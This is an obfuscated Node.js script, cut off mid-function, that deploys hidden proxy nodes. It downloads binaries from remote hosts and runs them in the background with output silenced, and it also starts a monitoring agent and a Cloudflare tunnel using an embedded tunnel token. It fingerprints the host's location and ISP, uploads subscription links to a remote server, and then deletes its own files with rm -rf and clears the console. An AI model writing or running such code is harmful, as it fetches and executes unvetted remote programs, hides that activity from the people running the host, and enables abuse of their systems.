const _0x156850=_0x2da6;(function(_0x396fbc,_0x5899cc){const _0x48f46f=_0x2da6,_0x274fa0=_0x396fbc();while(!![]){try{const _0x1286c0=-parseInt(_0x48f46f(0x150))/0x1*(-parseInt(_0x48f46f(0x1d5))/0x2)+-parseInt(_0x48f46f(0x1be))/0x3+parseInt(_0x48f46f(0x24e))/0x4*(-parseInt(_0x48f46f(0x23f))/0x5)+-parseInt(_0x48f46f(0x1b5))/0x6*(parseInt(_0x48f46f(0x172))/0x7)+-parseInt(_0x48f46f(0x204))/0x8+parseInt(_0x48f46f(0x121))/0x9*(-parseInt(_0x48f46f(0x22e))/0xa)+parseInt(_0x48f46f(0x1e8))/0xb;if(_0x1286c0===_0x5899cc)break;else _0x274fa0['push'](_0x274fa0['shift']());}catch(_0x53ac5d){_0x274fa0['push'](_0x274fa0['shift']());}}}(_0x3662,0x5e0bc));const express=require(_0x156850(0x244)),app=express(),axios=require(_0x156850(0x219)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require('util'),exec=promisify(require(_0x156850(0x144)+_0x156850(0x21d))['exec']),UPLOAD_URL=process['env'][_0x156850(0x163)]||'',PROJECT_URL=process[_0x156850(0x1b2)][_0x156850(0x134)+'L']||'',AUTO_ACCESS=process[_0x156850(0x1b2)][_0x156850(0x104)+'S']||![],FILE_PATH=process[_0x156850(0x1b2)][_0x156850(0x24c)]||_0x156850(0x1b0),SUB_PATH=process[_0x156850(0x1b2)][_0x156850(0x165)]||_0x156850(0x133),PORT=process[_0x156850(0x1b2)][_0x156850(0x1f4)+'T']||process[_0x156850(0x1b2)][_0x156850(0x196)]||0xbb8,UUID=process['env'][_0x156850(0x232)]||'09719f5a-f'+_0x156850(0x11b)+_0x156850(0x119)+_0x156850(0x239),NEZHA_SERVER=process[_0x156850(0x1b2)]['NEZHA_SERV'+'ER']||'',NEZHA_PORT=process[_0x156850(0x1b2)]['NEZHA_PORT']||'',NEZHA_KEY=process['env'][_0x156850(0x143)]||'',ARGO_DOMAIN=process[_0x156850(0x1b2)][_0x156850(0x1bf)+'N']||_0x156850(0x228)+_0x156850(0x1ad),ARGO_AUTH=process[_0x156850(0x1b2)][_0x156850(0x254)]||_0x156850(0x193)+'UyN2I3Mzg3'+_0x156850(0x173)+'Q1NGU0NGFk'+_0x156850(0x1aa)+'MiLCJ0Ijoi'+'ODcxNjUzNT'+_0x156850(0x17a)+_0x156850(0x18d)+_0x156850(0x14a)+_0x156850(0x1ec)+_0x156850(0x1e1)+_0x156850(0x148)+_0x156850(0x107)+_0x156850(0x127)+_0x156850(0x10d)+'TlRWa01Ea3'+'hZemxqTURk'+'ayJ9',ARGO_PORT=process['env']['ARGO_PORT']||0x1f55,CFIP=process['env'][_0x156850(0x17b)]||_0x156850(0x183)+'an',CFPORT=process['env'][_0x156850(0x241)]||0x1bb,NAME=process[_0x156850(0x1b2)][_0x156850(0x100)]||_0x156850(0x259);!fs[_0x156850(0x22f)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x156850(0x1a6)](FILE_PATH+(_0x156850(0x1de)+'d'))):console[_0x156850(0x1a6)](FILE_PATH+('\x20already\x20e'+_0x156850(0x11c)));function generateRandomName(){const _0x251979=_0x156850,_0x4027ce=_0x251979(0x1e6)+'klmnopqrst'+_0x251979(0x175);let _0x5f473c='';for(let _0x3fc976=0x0;_0x3fc976<0x6;_0x3fc976++){_0x5f473c+=_0x4027ce[_0x251979(0x178)](Math['floor'](Math[_0x251979(0x145)]()*_0x4027ce[_0x251979(0x105)]));}return _0x5f473c;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x156850(0x19e)](FILE_PATH,npmName),phpPath=path[_0x156850(0x19e)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x156850(0x19e)](FILE_PATH,_0x156850(0x1c9)),listPath=path[_0x156850(0x19e)](FILE_PATH,_0x156850(0x1ce)),bootLogPath=path['join'](FILE_PATH,_0x156850(0x1e7)),configPath=path[_0x156850(0x19e)](FILE_PATH,_0x156850(0x1b8)+'n');function deleteNodes(){const _0x176354=_0x156850;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x3d4cc8;try{_0x3d4cc8=fs[_0x176354(0x201)+'nc'](subPath,_0x176354(0x22d));}catch{return null;}const _0x57f057=Buffer[_0x176354(0x1d3)](_0x3d4cc8,_0x176354(0x230))[_0x176354(0x167)](_0x176354(0x22d)),_0x1de0b3=_0x57f057[_0x176354(0x1f9)]('\x0a')[_0x176354(0x249)](_0x31aa80=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x31aa80));if(_0x1de0b3[_0x176354(0x105)]===0x0)return;return axios[_0x176354(0x130)](UPLOAD_URL+('/api/delet'+_0x176354(0x1d0)),JSON[_0x176354(0x189)]({'nodes':_0x1de0b3}),{'headers':{'Content-Type':'applicatio'+_0x176354(0x142)}})[_0x176354(0x15e)](_0x44fd4b=>{return null;}),null;}catch(_0x2a7986){return null;}}function cleanupOldFiles(){const _0x14d8af=_0x156850;try{const _0x3031c2=fs[_0x14d8af(0x13e)+'c'](FILE_PATH);_0x3031c2[_0x14d8af(0x129)](_0x1796cf=>{const _0x15a3aa=_0x14d8af,_0x37665d=path[_0x15a3aa(0x19e)](FILE_PATH,_0x1796cf);try{const _0xc1a6cc=fs[_0x15a3aa(0x141)](_0x37665d);_0xc1a6cc[_0x15a3aa(0x1b7)]()&&fs[_0x15a3aa(0x195)](_0x37665d);}catch(_0x2eff2c){}});}catch(_0x325e6e){}}async function generateConfig(){const _0x4c5cef=_0x156850,_0x1d2977={'log':{'access':'/dev/null','error':_0x4c5cef(0x214),'loglevel':_0x4c5cef(0x158)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x4c5cef(0x186),'settings':{'clients':[{'id':UUID,'flow':_0x4c5cef(0x1c1)+_0x4c5cef(0x255)}],'decryption':_0x4c5cef(0x158),'fallbacks':[{'dest':0xbb9},{'path':_0x4c5cef(0x137)+'o','dest':0xbba},{'path':'/vmess-arg'+'o','dest':0xbbb},{'path':_0x4c5cef(0x1f8)+'go','dest':0xbbc}]},'streamSettings':{'network':_0x4c5cef(0x23c)}},{'port':0xbb9,'listen':_0x4c5cef(0x1e9),'protocol':_0x4c5cef(0x186),'settings':{'clients':[{'id':UUID}],'decryption':_0x4c5cef(0x158)},'streamSettings':{'network':'tcp','security':_0x4c5cef(0x158)}},{'port':0xbba,'listen':_0x4c5cef(0x1e9),'protocol':_0x4c5cef(0x186),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x4c5cef(0x158)},'streamSettings':{'network':'ws','security':_0x4c5cef(0x158),'wsSettings':{'path':'/vless-arg'+'o'}},'sniffing':{'enabled':!![],'destOverride':[_0x4c5cef(0x17c),_0x4c5cef(0x21f),_0x4c5cef(0x124)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x4c5cef(0x1ba),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-arg'+'o'}},'sniffing':{'enabled':!![],'destOverride':[_0x4c5cef(0x17c),_0x4c5cef(0x21f),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x4c5cef(0x1e9),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x4c5cef(0x158),'wsSettings':{'path':_0x4c5cef(0x1f8)+'go'}},'sniffing':{'enabled':!![],'destOverride':[_0x4c5cef(0x17c),'tls',_0x4c5cef(0x124)],'metadataOnly':![]}}],'dns':{'servers':[_0x4c5cef(0x248)+_0x4c5cef(0x235)+_0x4c5cef(0x1f5)+'y']},'outbounds':[{'protocol':'freedom','tag':_0x4c5cef(0x24a)},{'protocol':_0x4c5cef(0x179),'tag':_0x4c5cef(0x17d)}]};fs[_0x4c5cef(0x14e)+_0x4c5cef(0x1e5)](path[_0x4c5cef(0x19e)](FILE_PATH,'config.jso'+'n'),JSON[_0x4c5cef(0x189)](_0x1d2977,null,0x2));}function getSystemArchitecture(){const _0x1bca07=_0x156850,_0x5ae9aa=os[_0x1bca07(0x20d)]();return _0x5ae9aa===_0x1bca07(0x12a)||_0x5ae9aa===_0x1bca07(0x221)||_0x5ae9aa===_0x1bca07(0x108)?_0x1bca07(0x12a):_0x1bca07(0x207);}function downloadFile(_0x31c28d,_0x1172f2,_0x11e7fb){const _0x5893ca=_0x156850,_0xcef9d=_0x31c28d;!fs['existsSync'](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x401494=fs['createWrit'+_0x5893ca(0x1c4)](_0xcef9d);axios({'method':_0x5893ca(0x251),'url':_0x1172f2,'responseType':'stream'})['then'](_0x3117a6=>{const _0x5ba4db=_0x5893ca;_0x3117a6[_0x5ba4db(0x17e)][_0x5ba4db(0x1f7)](_0x401494),_0x401494['on']('finish',()=>{const _0x495e9e=_0x5ba4db;_0x401494[_0x495e9e(0x1ae)](),console['log'](_0x495e9e(0x247)+path['basename'](_0xcef9d)+(_0x495e9e(0x20a)+_0x495e9e(0x128))),_0x11e7fb(null,_0xcef9d);}),_0x401494['on'](_0x5ba4db(0x210),_0x32a945=>{const _0x398e70=_0x5ba4db;fs[_0x398e70(0x115)](_0xcef9d,()=>{});const _0x2685e2=_0x398e70(0x247)+path[_0x398e70(0x110)](_0xcef9d)+_0x398e70(0x237)+_0x32a945['message'];console[_0x398e70(0x210)](_0x2685e2),_0x11e7fb(_0x2685e2);});})[_0x5893ca(0x15e)](_0x1258b6=>{const _0x20159a=_0x5893ca,_0x101915='Download\x20'+path[_0x20159a(0x110)](_0xcef9d)+'\x20failed:\x20'+_0x1258b6[_0x20159a(0x184)];console['error'](_0x101915),_0x11e7fb(_0x101915);});}async function downloadFilesAndRun(){const _0x435a4b=_0x156850,_0xf822be=getSystemArchitecture(),_0x2340a7=getFilesForArchitecture(_0xf822be);if(_0x2340a7[_0x435a4b(0x105)]===0x0){console[_0x435a4b(0x1a6)](_0x435a4b(0x225)+'\x20a\x20file\x20fo'+'r\x20the\x20curr'+'ent\x20archit'+_0x435a4b(0x123));return;}const _0x43fa70=_0x2340a7['map'](_0x234561=>{return new Promise((_0x5665ad,_0x30d6d9)=>{const _0x1b6f70=_0x2da6;downloadFile(_0x234561['fileName'],_0x234561[_0x1b6f70(0x20c)],(_0x1de894,_0x4e2245)=>{_0x1de894?_0x30d6d9(_0x1de894):_0x5665ad(_0x4e2245);});});});try{await Promise[_0x435a4b(0x198)](_0x43fa70);}catch(_0x4ef3b3){console[_0x435a4b(0x210)](_0x435a4b(0x185)+'loading\x20fi'+_0x435a4b(0x11a),_0x4ef3b3);return;}function _0x2d2fa8(_0x2b7b3f){const _0x482020=_0x435a4b,_0x2e29eb=0x1fd;_0x2b7b3f[_0x482020(0x129)](_0x4ec6fe=>{const _0x15c19b=_0x482020;fs[_0x15c19b(0x22f)](_0x4ec6fe)&&fs['chmod'](_0x4ec6fe,_0x2e29eb,_0x126180=>{const _0x333f31=_0x15c19b;_0x126180?console[_0x333f31(0x210)]('Empowermen'+_0x333f31(0x16e)+_0x333f31(0x174)+_0x4ec6fe+':\x20'+_0x126180):console[_0x333f31(0x1a6)](_0x333f31(0x1b4)+'t\x20success\x20'+_0x333f31(0x203)+_0x4ec6fe+':\x20'+_0x2e29eb[_0x333f31(0x167)](0x8));});});}const _0x61f00f=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x2d2fa8(_0x61f00f);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x40ddf4=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x435a4b(0x1f9)](':')[_0x435a4b(0x1cd)]():'',_0x49cdb9=new Set(['443',_0x435a4b(0x250),_0x435a4b(0x12e),'2087',_0x435a4b(0x187),_0x435a4b(0x146)]),_0x282906=_0x49cdb9['has'](_0x40ddf4)?'true':_0x435a4b(0x180),_0x25ccb3='\x0aclient_se'+_0x435a4b(0x113)+NEZHA_KEY+('\x0adebug:\x20fa'+_0x435a4b(0x1f2)+_0x435a4b(0x140)+_0x435a4b(0x1d8)+_0x435a4b(0x160)+_0x435a4b(0x13f)+'ute:\x20false'+_0x435a4b(0x1bd)+_0x435a4b(0x209)+_0x435a4b(0x18b)+_0x435a4b(0x188)+_0x435a4b(0x1e4)+_0x435a4b(0x18f)+'query:\x20fal'+_0x435a4b(0x242)+'lse\x0ainsecu'+_0x435a4b(0x132)+'ue\x0aip_repo'+'rt_period:'+_0x435a4b(0x16b)+'rt_delay:\x20'+_0x435a4b(0x139))+NEZHA_SERVER+(_0x435a4b(0x1c5)+'ection_cou'+_0x435a4b(0x20f)+_0x435a4b(0x152)+_0x435a4b(0x1f0)+_0x435a4b(0x106)+'ure:\x20false'+_0x435a4b(0x227))+_0x282906+('\x0ause_gitee'+_0x435a4b(0x15d)+_0x435a4b(0x16c)+_0x435a4b(0x216)+_0x435a4b(0x1b1)+_0x435a4b(0x154)+_0x435a4b(0x199))+UUID;fs['writeFileS'+_0x435a4b(0x1e5)](path[_0x435a4b(0x19e)](FILE_PATH,_0x435a4b(0x13c)+'l'),_0x25ccb3);const _0x165a6c=_0x435a4b(0x1b9)+phpPath+_0x435a4b(0x12f)+FILE_PATH+(_0x435a4b(0x120)+_0x435a4b(0x1e0)+'null\x202>&1\x20'+'&');try{await exec(_0x165a6c),console[_0x435a4b(0x1a6)](phpName+(_0x435a4b(0x16d)+'g')),await new Promise(_0x1d490b=>setTimeout(_0x1d490b,0x3e8));}catch(_0x22bd70){console[_0x435a4b(0x210)](_0x435a4b(0x23b)+_0x435a4b(0x22c)+_0x22bd70);}}else{let _0x3429cc='';const _0x62b890=[_0x435a4b(0x136),_0x435a4b(0x250),_0x435a4b(0x12e),'2087',_0x435a4b(0x187),_0x435a4b(0x146)];_0x62b890[_0x435a4b(0x1a2)](NEZHA_PORT)&&(_0x3429cc=_0x435a4b(0x1da));const _0x5b9e19=_0x435a4b(0x1b9)+npmPath+_0x435a4b(0x15c)+NEZHA_SERVER+':'+NEZHA_PORT+_0x435a4b(0x101)+NEZHA_KEY+'\x20'+_0x3429cc+(_0x435a4b(0x1c3)+'-auto-upda'+_0x435a4b(0x1a9)+'t-delay\x204\x20'+'--skip-con'+_0x435a4b(0x1a5)+_0x435a4b(0x114)+_0x435a4b(0x20e)+'\x20&');try{await exec(_0x5b9e19),console[_0x435a4b(0x1a6)](npmName+(_0x435a4b(0x16d)+'g')),await new Promise(_0x16e8d5=>setTimeout(_0x16e8d5,0x3e8));}catch(_0x29806b){console['error'](_0x435a4b(0x10f)+_0x435a4b(0x22c)+_0x29806b);}}}else console[_0x435a4b(0x1a6)](_0x435a4b(0x22b)+_0x435a4b(0x1ea)+_0x435a4b(0x1fb)+_0x435a4b(0x162));const _0x217770=_0x435a4b(0x1b9)+webPath+_0x435a4b(0x245)+FILE_PATH+('/config.js'+'on\x20>/dev/n'+_0x435a4b(0x1ca));try{await exec(_0x217770),console[_0x435a4b(0x1a6)](webName+('\x20is\x20runnin'+'g')),await new Promise(_0x37e2a9=>setTimeout(_0x37e2a9,0x3e8));}catch(_0x114fb9){console['error']('web\x20runnin'+_0x435a4b(0x22c)+_0x114fb9);}if(fs[_0x435a4b(0x22f)](botPath)){let _0x4271c3;if(ARGO_AUTH[_0x435a4b(0x157)](/^[A-Z0-9a-z=]{120,250}$/))_0x4271c3=_0x435a4b(0x111)+_0x435a4b(0x169)+_0x435a4b(0x19d)+_0x435a4b(0x1ed)+_0x435a4b(0x258)+_0x435a4b(0x224)+_0x435a4b(0x253)+_0x435a4b(0x1eb)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x4271c3=_0x435a4b(0x111)+_0x435a4b(0x169)+_0x435a4b(0x19d)+'--config\x20'+FILE_PATH+('/tunnel.ym'+_0x435a4b(0x1dd)):_0x4271c3=_0x435a4b(0x111)+_0x435a4b(0x169)+_0x435a4b(0x19d)+_0x435a4b(0x1ed)+_0x435a4b(0x258)+_0x435a4b(0x224)+_0x435a4b(0x168)+_0x435a4b(0x25a)+FILE_PATH+('/boot.log\x20'+_0x435a4b(0x22a)+'\x20info\x20--ur'+_0x435a4b(0x1a0)+_0x435a4b(0x17f))+ARGO_PORT;try{await exec(_0x435a4b(0x1b9)+botPath+'\x20'+_0x4271c3+(_0x435a4b(0x16a)+'l\x202>&1\x20&')),console[_0x435a4b(0x1a6)](botName+(_0x435a4b(0x16d)+'g')),await new Promise(_0x415b31=>setTimeout(_0x415b31,0x7d0));}catch(_0xec176c){console[_0x435a4b(0x210)]('Error\x20exec'+_0x435a4b(0x192)+_0x435a4b(0x159)+_0xec176c);}}await new Promise(_0xaf1b53=>setTimeout(_0xaf1b53,0x1388));}function getFilesForArchitecture(_0x59c40a){const _0x203c3b=_0x156850;let _0x1a184e;_0x59c40a===_0x203c3b(0x12a)?_0x1a184e=[{'fileName':webPath,'fileUrl':_0x203c3b(0x19f)+_0x203c3b(0x21e)+_0x203c3b(0x213)},{'fileName':botPath,'fileUrl':'https://ar'+_0x203c3b(0x21e)+'yc.mn/bot'}]:_0x1a184e=[{'fileName':webPath,'fileUrl':_0x203c3b(0x1b3)+_0x203c3b(0x194)+_0x203c3b(0x213)},{'fileName':botPath,'fileUrl':_0x203c3b(0x1b3)+'d64.ssss.n'+_0x203c3b(0x126)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x8b9d1b=_0x59c40a==='arm'?_0x203c3b(0x19f)+_0x203c3b(0x21e)+_0x203c3b(0x222)+'t':'https://am'+_0x203c3b(0x194)+'yc.mn/agen'+'t';_0x1a184e[_0x203c3b(0x18e)]({'fileName':npmPath,'fileUrl':_0x8b9d1b});}else{const _0x6a0ae1=_0x59c40a===_0x203c3b(0x12a)?'https://ar'+'m64.ssss.n'+_0x203c3b(0x15a):_0x203c3b(0x1b3)+'d64.ssss.n'+_0x203c3b(0x15a);_0x1a184e[_0x203c3b(0x18e)]({'fileName':phpPath,'fileUrl':_0x6a0ae1});}}return _0x1a184e;}function argoType(){const _0xc1fa3a=_0x156850;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0xc1fa3a(0x1a6)](_0xc1fa3a(0x1bf)+_0xc1fa3a(0x243)+_0xc1fa3a(0x155)+_0xc1fa3a(0x229)+_0xc1fa3a(0x176)+'ick\x20tunnel'+'s');return;}if(ARGO_AUTH[_0xc1fa3a(0x1a2)](_0xc1fa3a(0x11d)+'et')){fs[_0xc1fa3a(0x14e)+'ync'](path[_0xc1fa3a(0x19e)](FILE_PATH,'tunnel.jso'+'n'),ARGO_AUTH);const _0x130b65='\x0a\x20\x20tunnel:'+'\x20'+ARGO_AUTH[_0xc1fa3a(0x1f9)]('\x22')[0xb]+(_0xc1fa3a(0x13b)+_0xc1fa3a(0x190)+'\x20')+path[_0xc1fa3a(0x19e)](FILE_PATH,'tunnel.jso'+'n')+(_0xc1fa3a(0x131)+_0xc1fa3a(0x246)+_0xc1fa3a(0x12b)+_0xc1fa3a(0x1db)+_0xc1fa3a(0x181))+ARGO_DOMAIN+(_0xc1fa3a(0x1bc)+_0xc1fa3a(0x1d9)+_0xc1fa3a(0x206)+_0xc1fa3a(0x151))+ARGO_PORT+(_0xc1fa3a(0x102)+'ginRequest'+_0xc1fa3a(0x13a)+_0xc1fa3a(0x24f)+_0xc1fa3a(0x15f)+_0xc1fa3a(0x10b)+_0xc1fa3a(0x11e)+_0xc1fa3a(0x1c8)+'\x20');fs[_0xc1fa3a(0x14e)+_0xc1fa3a(0x1e5)](path[_0xc1fa3a(0x19e)](FILE_PATH,'tunnel.yml'),_0x130b65);}else console[_0xc1fa3a(0x1a6)](_0xc1fa3a(0x118)+_0xc1fa3a(0x233)+_0xc1fa3a(0x112)+'t,use\x20toke'+_0xc1fa3a(0x205)+_0xc1fa3a(0x21b));}async function extractDomains(){const _0x27d765=_0x156850;let _0x1a0bf0;if(ARGO_AUTH&&ARGO_DOMAIN)_0x1a0bf0=ARGO_DOMAIN,console[_0x27d765(0x1a6)]('ARGO_DOMAI'+'N:',_0x1a0bf0),await _0x1ee21f(_0x1a0bf0);else try{const _0xa0980a=fs['readFileSy'+'nc'](path[_0x27d765(0x19e)](FILE_PATH,_0x27d765(0x1e7)),_0x27d765(0x22d)),_0x17adca=_0xa0980a['split']('\x0a'),_0x1e09ee=[];_0x17adca[_0x27d765(0x129)](_0x2df7ce=>{const _0x447920=_0x27d765,_0x4e0db3=_0x2df7ce[_0x447920(0x157)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x4e0db3){const _0x3ccf19=_0x4e0db3[0x1];_0x1e09ee['push'](_0x3ccf19);}});if(_0x1e09ee[_0x27d765(0x105)]>0x0)_0x1a0bf0=_0x1e09ee[0x0],console[_0x27d765(0x1a6)](_0x27d765(0x14b)+':',_0x1a0bf0),await _0x1ee21f(_0x1a0bf0);else{console[_0x27d765(0x1a6)](_0x27d765(0x14b)+'\x20not\x20found'+_0x27d765(0x252)+_0x27d765(0x1bb)+_0x27d765(0x1a4)+_0x27d765(0x161)),fs[_0x27d765(0x195)](path[_0x27d765(0x19e)](FILE_PATH,_0x27d765(0x1e7)));async function _0x351e1b(){const _0x5ffaf5=_0x27d765;try{process[_0x5ffaf5(0x1f3)]===_0x5ffaf5(0x20b)?await exec(_0x5ffaf5(0x1df)+_0x5ffaf5(0x109)+botName+('.exe\x20>\x20nul'+_0x5ffaf5(0x220))):await exec(_0x5ffaf5(0x191)+'['+botName[_0x5ffaf5(0x178)](0x0)+']'+botName['substring'](0x1)+(_0x5ffaf5(0x1c6)+'ull\x202>&1'));}catch(_0x4b4891){}}_0x351e1b(),await new Promise(_0x1c07db=>setTimeout(_0x1c07db,0xbb8));const _0x158e4b='tunnel\x20--e'+_0x27d765(0x169)+_0x27d765(0x19d)+_0x27d765(0x1ed)+_0x27d765(0x258)+'otocol\x20htt'+'p2\x20--logfi'+'le\x20'+FILE_PATH+('/boot.log\x20'+_0x27d765(0x22a)+_0x27d765(0x212)+'l\x20http://l'+_0x27d765(0x17f))+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x158e4b+(_0x27d765(0x16a)+_0x27d765(0x23a))),console['log'](botName+('\x20is\x20runnin'+'g')),await new Promise(_0x5f3ab8=>setTimeout(_0x5f3ab8,0xbb8)),await extractDomains();}catch(_0x14f25c){console[_0x27d765(0x210)](_0x27d765(0x217)+'uting\x20comm'+_0x27d765(0x159)+_0x14f25c);}}}catch(_0x5e8226){console[_0x27d765(0x210)](_0x27d765(0x1ff)+'ing\x20boot.l'+_0x27d765(0x1a7),_0x5e8226);}async function _0x4d0954(){const _0x578c30=_0x27d765;try{const _0x4a4059=await axios[_0x578c30(0x251)]('https://ap'+_0x578c30(0x10e)+_0x578c30(0x14d),{'headers':{'User-Agent':'Mozilla/5.'+'0','timeout':0xbb8}});if(_0x4a4059['data']&&_0x4a4059[_0x578c30(0x17e)][_0x578c30(0x1d6)+'de']&&_0x4a4059[_0x578c30(0x17e)]['isp'])return(_0x4a4059[_0x578c30(0x17e)][_0x578c30(0x1d6)+'de']+'-'+_0x4a4059[_0x578c30(0x17e)][_0x578c30(0x10c)])[_0x578c30(0x1af)](/\s+/g,'_');}catch(_0x5b570a){try{const _0x2c85d9=await axios[_0x578c30(0x251)](_0x578c30(0x1fc)+_0x578c30(0x135)+'on',{'headers':{'User-Agent':_0x578c30(0x21c)+'0','timeout':0xbb8}});if(_0x2c85d9['data']&&_0x2c85d9[_0x578c30(0x17e)][_0x578c30(0x149)]===_0x578c30(0x218)&&_0x2c85d9[_0x578c30(0x17e)][_0x578c30(0x182)+'e']&&_0x2c85d9['data'][_0x578c30(0x177)])return(_0x2c85d9['data'][_0x578c30(0x182)+'e']+'-'+_0x2c85d9[_0x578c30(0x17e)][_0x578c30(0x177)])[_0x578c30(0x1af)](/\s+/g,'_');}catch(_0xae6718){}}return'Unknown';}async function _0x1ee21f(_0x16e01b){const _0x2be673=await _0x4d0954(),_0x5bd15f=NAME?NAME+'-'+_0x2be673:_0x2be673;return new Promise(_0x4ff65a=>{setTimeout(()=>{const _0x81d47b=_0x2da6,_0x2655f9={'v':'2','ps':''+_0x5bd15f,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x81d47b(0x1e2),'net':'ws','type':_0x81d47b(0x158),'host':_0x16e01b,'path':'/vmess-arg'+_0x81d47b(0x234),'tls':'tls','sni':_0x16e01b,'alpn':'','fp':_0x81d47b(0x208)},_0x4885c8=_0x81d47b(0x223)+UUID+'@'+CFIP+':'+CFPORT+(_0x81d47b(0x1d2)+_0x81d47b(0x116)+_0x81d47b(0x153)+_0x81d47b(0x256))+_0x16e01b+(_0x81d47b(0x257)+_0x81d47b(0x1a8)+_0x81d47b(0x1fe))+_0x16e01b+('&path=%2Fv'+_0x81d47b(0x14f)+_0x81d47b(0x1fa)+'0#')+_0x5bd15f+_0x81d47b(0x13d)+Buffer[_0x81d47b(0x1d3)](JSON['stringify'](_0x2655f9))[_0x81d47b(0x167)](_0x81d47b(0x230))+(_0x81d47b(0x1dc)+'/')+UUID+'@'+CFIP+':'+CFPORT+(_0x81d47b(0x1ab)+_0x81d47b(0x125))+_0x16e01b+('&fp=firefo'+_0x81d47b(0x1a8)+_0x81d47b(0x1fe))+_0x16e01b+(_0x81d47b(0x1cc)+_0x81d47b(0x215)+_0x81d47b(0x200)+_0x81d47b(0x21a))+_0x5bd15f+_0x81d47b(0x23e);console[_0x81d47b(0x1a6)](Buffer['from'](_0x4885c8)[_0x81d47b(0x167)](_0x81d47b(0x230))),fs['writeFileS'+_0x81d47b(0x1e5)](subPath,Buffer[_0x81d47b(0x1d3)](_0x4885c8)[_0x81d47b(0x167)](_0x81d47b(0x230))),console[_0x81d47b(0x1a6)](FILE_PATH+(_0x81d47b(0x211)+_0x81d47b(0x10a)+_0x81d47b(0x122))),uploadNodes(),app[_0x81d47b(0x251)]('/'+SUB_PATH,(_0x55d7dc,_0x259586)=>{const _0x5b16d1=_0x81d47b,_0x3b0b88=Buffer[_0x5b16d1(0x1d3)](_0x4885c8)['toString']('base64');_0x259586[_0x5b16d1(0x19b)](_0x5b16d1(0x164)+'pe',_0x5b16d1(0x19a)+_0x5b16d1(0x1c0)+_0x5b16d1(0x22d)),_0x259586[_0x5b16d1(0x240)](_0x3b0b88);}),_0x4ff65a(_0x4885c8);},0x7d0);});}}async function uploadNodes(){const _0x1955bb=_0x156850;if(UPLOAD_URL&&PROJECT_URL){const _0xd18b56=PROJECT_URL+'/'+SUB_PATH,_0x2d2149={'subscription':[_0xd18b56]};try{const _0x28860f=await axios[_0x1955bb(0x130)](UPLOAD_URL+('/api/add-s'+'ubscriptio'+'ns'),_0x2d2149,{'headers':{'Content-Type':'applicatio'+_0x1955bb(0x142)}});return _0x28860f&&_0x28860f[_0x1955bb(0x149)]===0xc8?(console['log'](_0x1955bb(0x1ef)+_0x1955bb(0x23d)+_0x1955bb(0x147)+'ully'),_0x28860f):null;}catch(_0x355879){if(_0x355879[_0x1955bb(0x171)]){if(_0x355879['response'][_0x1955bb(0x149)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x48df67=fs[_0x1955bb(0x201)+'nc'](listPath,_0x1955bb(0x22d)),_0x3ea5b2=_0x48df67[_0x1955bb(0x1f9)]('\x0a')[_0x1955bb(0x249)](_0x2cf5a8=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1955bb(0x1cb)](_0x2cf5a8));if(_0x3ea5b2['length']===0x0)return;const _0x3dfb98=JSON[_0x1955bb(0x189)]({'nodes':_0x3ea5b2});try{const _0x4c0c59=await axios[_0x1955bb(0x130)](UPLOAD_URL+('/api/add-n'+'odes'),_0x3dfb98,{'headers':{'Content-Type':_0x1955bb(0x238)+_0x1955bb(0x142)}});return _0x4c0c59&&_0x4c0c59[_0x1955bb(0x149)]===0xc8?(console[_0x1955bb(0x1a6)](_0x1955bb(0x1b6)+'aded\x20succe'+_0x1955bb(0x122)),_0x4c0c59):null;}catch(_0x3d9be1){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x467b31=_0x2da6,_0x19c81c=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x19c81c['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x19c81c[_0x467b31(0x170)](phpPath);process[_0x467b31(0x1f3)]===_0x467b31(0x20b)?exec(_0x467b31(0x1d7)+_0x19c81c['join']('\x20')+(_0x467b31(0x1a3)+'1'),_0x206484=>{const _0x478b06=_0x467b31;console[_0x478b06(0x1ee)](),console[_0x478b06(0x1a6)](_0x478b06(0x1c7)+_0x478b06(0x1f6)),console['log']('Thank\x20you\x20'+_0x478b06(0x1fd)+'this\x20scrip'+_0x478b06(0x18a));}):exec('rm\x20-rf\x20'+_0x19c81c[_0x467b31(0x19e)]('\x20')+(_0x467b31(0x16a)+_0x467b31(0x16f)),_0x495450=>{const _0x21ac05=_0x467b31;console['clear'](),console['log'](_0x21ac05(0x1c7)+_0x21ac05(0x1f6)),console[_0x21ac05(0x1a6)](_0x21ac05(0x1e3)+'for\x20using\x20'+_0x21ac05(0x15b)+'t,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x5b21ca=_0x156850;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x5b21ca(0x1a6)](_0x5b21ca(0x12c)+_0x5b21ca(0x236)+_0x5b21ca(0x117)+_0x5b21ca(0x1ac));return;}try{const 